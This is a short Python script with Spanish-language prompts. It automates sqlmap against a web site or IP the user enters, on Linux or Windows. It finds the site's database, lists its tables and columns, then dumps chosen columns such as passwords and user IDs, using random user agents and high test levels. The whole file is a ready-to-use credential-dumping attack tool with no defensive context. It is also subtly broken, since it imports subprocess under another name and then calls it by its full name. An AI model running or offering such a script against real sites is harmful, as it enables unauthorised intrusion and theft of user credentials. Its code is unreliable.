import os
import subprocess as sp
import platform

def run_linux_sqlmap(o, s, e, pass_usr):
    subprocess.run(["sudo", "sqlmap", "-u", o, "--random-agent", "--current-db", "--level=5", "--dbms=Mysql"], check=True)
    subprocess.run(["sudo", "sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "--tables"], check=True)
    subprocess.run(["sudo", "sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "-T", e, "--columns"], check=True)
    subprocess.run(["sudo", "sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "-T", e, "-C", ",".join(pass_usr), "--dump"], check=True)

# Run sqlmap on Windows

def run_windows_sqlmap(o, s, e, pass_usr):
    subprocess.run(["sqlmap", "-u", o, "--random-agent", "--current-db", "--level=5", "--dbms=Mysql"], check=True)
    subprocess.run(["sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "--tables"], check=True)
    subprocess.run(["sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "-T", e, "--columns"], check=True)
    subprocess.run(["sqlmap", "-u", o, "--random-agent", "--level=5", "--dbms=Mysql", "-D", s, "-T", e, "-C", ",".join(pass_usr), "--dump"], check=True)


def main():
    print("Secuencua SQLMap")
    o = input("Sitio web, IP> ")
    s = input("Enter DBS> ")
    e = input("Your user> ")
    pass_usr = input("El {pass} and {id} of page> ").split()

    if platform.system() == "Linux":
        run_linux_sqlmap(o, s, e, pass_usr)
    elif platform.system() == "Windows":
        run_windows_sqlmap(o, s, e, pass_usr)
    else:
      print("System operativo no encontrado:")
    input("Press to continue...")

if __name__ == "__main__":
    main()
